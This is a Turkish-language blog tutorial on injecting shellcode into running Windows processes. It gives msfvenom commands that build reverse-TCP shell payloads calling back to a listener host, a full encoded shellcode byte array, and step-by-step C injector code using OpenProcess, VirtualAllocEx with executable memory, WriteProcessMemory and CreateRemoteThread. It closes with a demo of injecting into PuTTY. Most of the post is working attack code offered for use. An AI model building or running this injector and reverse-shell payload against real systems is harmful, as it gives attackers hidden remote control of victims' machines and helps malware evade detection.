---
title: Process Shellcode Injection
layout: post
---

### Process Shellcode Injection

Merhaba arkadaşlar yeni yazıma hoşgeldiniz.

Çinliler ile olan birkaç serüvenim yüzünden bu yazıyı biraz geç yazmak zorunda kaldım. 

Serüvenlerden [bir tanesini twitterde](https://twitter.com/0DAYanc/status/1121174960209301504) paylaştım bakmak isterseniz.

Hiç uzatmadan yazımıza geçelim. Bu yazımızda **windows** içerisinde bulunan **process**'ler içerisine nasıl **shellcode** **inject** edebileceğimizi göreceğiz.

Öncelikle yazımıza geçmeden önce **C**, **Windows Memory Management**, **Heap - Stack** gibi kavramlara alışık olduğunuzu varsayıp bu yazıyı devam ettiriyorum.

## Bilmemiz gereken kavramlar

# Shellcode Nedir ?

*Shellcode kabuk kod demektir. Bunlara kısaca **Hexcode** veya **Hex** de diyebiliriz.*

*Örneğin büyük **A** harfinin **shellcode** yani **hexcode** yani **hex** karşılığı **0x41**'dir.*

Basit bir şekilde **makine kodu** dur.

***İşletim sistemi** ve **User-mode application**'ların birbirleri ile anlaştığı dil de diyebiliriz.*

# Process Nedir ?

***İşletim sistemi**'nin arka planında çalışan **Uygulamalar** yani **User-mode applications** diyebiliriz.*

# Process Shellcode Injection Nedir ?

*Yukarıda ki iki terimi birleştirip yanına **Injection** eklediğimizde oluşan kavram.*

*Ya da daha kompleks şekilde mevcut bir **process** içerisinde çalışan **hexcode**'ların önüne eklediğimiz yeni **hexcode**'lar da **Process Shellcode Injection** kavramına uygundur.*

## Herşeyden önce
Birazdan yazmaya ve anlatmaya başlayacağımız **Process Shellcode Injection**'u gerçekleştirmek için gerekli olan kaynak kodu **derleme** sıkıntısı yaşayanlar olursa **Visual Studio 2019 Community** IDE'sini indirip içerisinde derleyebilir.


## Kaynak kodumuza geçelim

Kütüphanelerimizi dahil edelim :

```
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
```

Main fonksiyonumuzu oluşturalım :

```
int main(int argc, char** argv) {

}
```

Şimdi geldik biraz zahmetli kısıma : 

```
unsigned char shellcode[] = "shellcodeburaya";
```

Bu kısım bizim **process** içerisinde çalıştıracağımız **hexcode** yani **shellcode**'umuzu içeriyor.

Bunu oluşturmak için uğraşmadan **metasploit** içerisinde bulunan **msfvenom** toolundan yararlanabiliriz.

**x64** için :

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
```

**x32** için:

```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
```

Burada bulunan **LHOST** ve**LPORT** kısmını kendinize göre düzenlediğinizi varsayıyorum

Komutu çalıştırdıktan sonra bize **C** ile uyumlu bir **shellcode** gelecek aşşağıda yüklediğim fotoraftaki gibi :

![](https://i.hizliresim.com/16QMMA.png)

Bu gelen **shellcode**'u yukarıdaki **buffer**'imize ekleyelim :

```
unsigned char shellcode[] = 
		 "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		 "\xff\xff\x48\xbb\x9e\xfc\xbf\xb8\x05\xa1\x62\x7f\x48\x31\x58"
		 "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x62\xb4\x3c\x5c\xf5\x49"
		 "\xa2\x7f\x9e\xfc\xfe\xe9\x44\xf1\x30\x2e\xc8\xb4\x8e\x6a\x60"
		 "\xe9\xe9\x2d\xfe\xb4\x34\xea\x1d\xe9\xe9\x2d\xbe\xb4\x34\xca"
		 "\x55\xe9\x6d\xc8\xd4\xb6\xf2\x89\xcc\xe9\x53\xbf\x32\xc0\xde"
		 "\xc4\x07\x8d\x42\x3e\x5f\x35\xb2\xf9\x04\x60\x80\x92\xcc\xbd"
		 "\xee\xf0\x8e\xf3\x42\xf4\xdc\xc0\xf7\xb9\xd5\x2a\xe2\xf7\x9e"
		 "\xfc\xbf\xf0\x80\x61\x16\x18\xd6\xfd\x6f\xe8\x8e\xe9\x7a\x3b"
		 "\x15\xbc\x9f\xf1\x04\x71\x81\x29\xd6\x03\x76\xf9\x8e\x95\xea"
		 "\x37\x9f\x2a\xf2\x89\xcc\xe9\x53\xbf\x32\xbd\x7e\x71\x08\xe0"
		 "\x63\xbe\xa6\x1c\xca\x49\x49\xa2\x2e\x5b\x96\xb9\x86\x69\x70"
		 "\x79\x3a\x3b\x15\xbc\x9b\xf1\x04\x71\x04\x3e\x15\xf0\xf7\xfc"
		 "\x8e\xe1\x7e\x36\x9f\x2c\xfe\x33\x01\x29\x2a\x7e\x4e\xbd\xe7"
		 "\xf9\x5d\xff\x3b\x25\xdf\xa4\xfe\xe1\x44\xfb\x2a\xfc\x72\xdc"
		 "\xfe\xea\xfa\x41\x3a\x3e\xc7\xa6\xf7\x33\x17\x48\x35\x80\x61"
		 "\x03\xe2\xf1\xbb\xd6\x11\x4d\xc1\xcf\x8d\xb8\x05\xe0\x34\x36"
		 "\x17\x1a\xf7\x39\xe9\x01\x63\x7f\x9e\xb5\x36\x5d\x4c\x1d\x60"
		 "\x7f\x8f\xa0\x7f\x10\x05\xc9\x23\x2b\xd7\x75\x5b\xf4\x8c\x50"
		 "\x23\xc5\xd2\x8b\x99\xbf\xfa\x74\x2e\xf6\x74\x94\xbe\xb9\x05"
		 "\xa1\x3b\x3e\x24\xd5\x3f\xd3\x05\x5e\xb7\x2f\xce\xb1\x8e\x71"
		 "\x48\x90\xa2\x37\x61\x3c\xf7\x31\xc7\xe9\x9d\xbf\xd6\x75\x7e"
		 "\xf9\xbf\x4b\x6d\xa0\x7e\x03\x6a\xf0\x8c\x66\x08\x6f\xdf\xa4"
		 "\xf3\x31\xe7\xe9\xeb\x86\xdf\x46\x26\x1d\x71\xc0\x9d\xaa\xd6"
		 "\x7d\x7b\xf8\x07\xa1\x62\x36\x26\x9f\xd2\xdc\x05\xa1\x62\x7f"
		 "\x9e\xbd\xef\xf9\x55\xe9\xeb\x9d\xc9\xab\xe8\xf5\x34\x61\x08"
		 "\x72\xc7\xbd\xef\x5a\xf9\xc7\xa5\x3b\xba\xa8\xbe\xb9\x4d\x2c"
		 "\x26\x5b\x86\x3a\xbf\xd0\x4d\x28\x84\x29\xce\xbd\xef\xf9\x55"
		 "\xe0\x32\x36\x61\x3c\xfe\xe8\x4c\x5e\xaa\x32\x17\x3d\xf3\x31"
		 "\xc4\xe0\xd8\x06\x52\xc3\x39\x47\xd0\xe9\x53\xad\xd6\x03\x75"
		 "\x33\x0b\xe0\xd8\x77\x19\xe1\xdf\x47\xd0\x1a\x92\xca\x3c\xaa"
		 "\xfe\x02\xa3\x34\xdf\xe2\x61\x29\xf7\x3b\xc1\x89\x5e\x79\xe2"
		 "\xf6\x3f\x43\xe5\xd4\x67\xc4\xd9\xef\xcd\xd7\x6f\xa1\x3b\x3e"
		 "\x17\x26\x40\x6d\x05\xa1\x62\x7f";
```

Şimdi sıra geldi bu **Shellcode**'u belirteceğimiz **process**'in içine eklemeye.

Herşeyden önce bizim **process** içerisine bu **shellcode**'u eklememiz için o **process**'i açmamız gerekiyor.

```
HANDLE processwithpid = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
```

**Fonksiyon**'nun ne işe yaradığını açıklamak ile uğraşmayacağım ama ben merak ettim diyen varsa aşşağıya bu fonksiyonun windows tarafından açıklandığı dökümantasyonunu bırakıyorum :

[OpenProcess Win API](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)
 
 **HANDLE**'mizi oluşturup içerisine **OpenProcess**'e 3. parametre olarak **Inject** olmak istediğimiz **Process PID**'sini verip **process**'imizi açıyoruz.
 
 Bundan sonra **VirtualAllocEx** fonksiyonunu kullanarak oluşturduğumuz **shellcode**'un boyutu kadar **process** içerisinde alan ayırıyoruz :
 
 ```
 PVOID joinprocess = VirtualAllocEx(processwithpid, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 ```
 
 Basit bir şekilde **VirtualAllocEx**'in nasıl kullanıldığına ve parametrelerinin neler olduğuna bakmak isteyen olursa buradan ulaşabilir **windows** tarafından oluşturulmuş **dökümantasyonuna**  : 
 
 [VirtualAllocEx Win API](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex)
 
 Şimdi sıra geldi bu **process** içerisinde oluşturduğumuz **alan**'ın içerisine bizim **shellcode**'umuzu yazmaya yani **Inject** etmeye :
 
 ```
 WriteProcessMemory(processwithpid, joinprocess, shellcode, sizeof shellcode, NULL);
 ```
 
 Bunuda **WriteProcessMemory** ile yapabiliyoruz. **Windows** tarafından oluşturulmuş **dökümantasyonuna** ulaşmak için :
 
 [WriteProcessMemory Win API](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory)
 
 Şimdi bir **thread** oluşturup tüm bu yukarıda gerçekleştirdiğimiz işlemleri gerçekleştirmeye geldi sıra :
 
 ```
 HANDLE threadhandler = CreateRemoteThread(processwithpid, NULL, 0, (LPTHREAD_START_ROUTINE)joinprocess, NULL, 0, NULL);
 ```
 
 Bunuda **CreateRemoteThread** fonksiyonu ile yapabiliyoruz onunda **windows** tarafından oluşturulmuş **dökümantasyonuna** buradan ulaşabilirsiniz :
 
 [CreateRemoteThread Win API](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread)
 
 Ve son olarak bu thread'i kapamaya geldi sıra :
 
 ```
 CloseHandle(processwithpid);
 ```
 
 Yukarıda ki tüm kodların birleşimine buradan ulaşıp derleyebilirsiniz : [Pastebin](https://pastebin.com/1gPb1PAM)
 
 # Demo
 
 **Derledikten** sonra nasıl çalışıp **putty** içerisine **shellcode** **injection** ettiğimizi gösteren küçük bir gizli youtube videosu :
 
 [Demo Video](https://youtu.be/oaNvWM9k84g)
 
 Yazı hakkında aklınızda soru işareti varsa twitter hesabım : [@0DAYanc](https://www.twitter.com/0DAYanc)